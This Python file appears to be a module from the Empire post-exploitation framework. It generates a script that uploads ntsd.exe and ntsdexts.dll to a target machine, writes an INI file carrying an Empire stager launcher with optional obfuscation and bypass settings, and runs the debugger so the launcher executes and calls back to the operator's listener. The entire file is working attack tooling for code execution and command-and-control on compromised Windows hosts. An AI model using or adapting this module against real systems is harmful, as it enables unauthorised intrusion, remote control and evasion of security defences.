from __future__ import print_function

from builtins import object, str
from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):

        listener_name = params["Listener"]
        upload_path = params["UploadPath"].strip()
        bin = params["BinPath"]
        arch = params["Arch"]
        ntsd_exe_upload_path = upload_path + "\\" + "ntsd.exe"
        ntsd_dll_upload_path = upload_path + "\\" + "ntsdexts.dll"

        # staging options
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        if arch == "x64":
            ntsd_exe = (
                main_menu.installPath
                + "/data/module_source/code_execution/ntsd_x64.exe"
            )
            ntsd_dll = (
                main_menu.installPath
                + "/data/module_source/code_execution/ntsdexts_x64.dll"
            )
        elif arch == "x86":
            ntsd_exe = (
                main_menu.installPath
                + "/data/module_source/code_execution/ntsd_x86.exe"
            )
            ntsd_dll = (
                main_menu.installPath
                + "/data/module_source/code_execution/ntsdexts_x86.dll"
            )

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = ""
        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: %s" % (listener_name))
        else:

            l = main_menu.stagertemplatesv2.new_instance("multi_launcher")
            l.options["Listener"] = params["Listener"]
            l.options["UserAgent"] = params["UserAgent"]
            l.options["Proxy"] = params["Proxy"]
            l.options["ProxyCreds"] = params["ProxyCreds"]
            l.options["Obfuscate"] = params["Obfuscate"]
            l.options["ObfuscateCommand"] = params["ObfuscateCommand"]
            l.options["Bypasses"] = params["Bypasses"]
            launcher = l.generate()

            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")
            else:
                launcher_code = launcher.split(" ")[-1]

                with open(ntsd_exe, "rb") as bin_data:
                    ntsd_exe_data = bin_data.read()

                with open(ntsd_dll, "rb") as bin_data:
                    ntsd_dll_data = bin_data.read()

                exec_write = 'Write-Ini %s "%s"' % (upload_path, launcher)
                code_exec = "%s\\ntsd.exe -cf %s\\ntsd.ini %s" % (
                    upload_path,
                    upload_path,
                    bin,
                )
                ntsd_exe_upload = main_menu.stagers.generate_upload(
                    ntsd_exe_data, ntsd_exe_upload_path
                )
                ntsd_dll_upload = main_menu.stagers.generate_upload(
                    ntsd_dll_data, ntsd_dll_upload_path
                )

                script_end += "\r\n"
                script_end += ntsd_exe_upload
                script_end += ntsd_dll_upload
                script_end += "\r\n"
                script_end += exec_write
                script_end += "\r\n"
                # this is to make sure everything was uploaded properly
                script_end += "Start-Sleep -s 5"
                script_end += "\r\n"
                script_end += code_exec

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
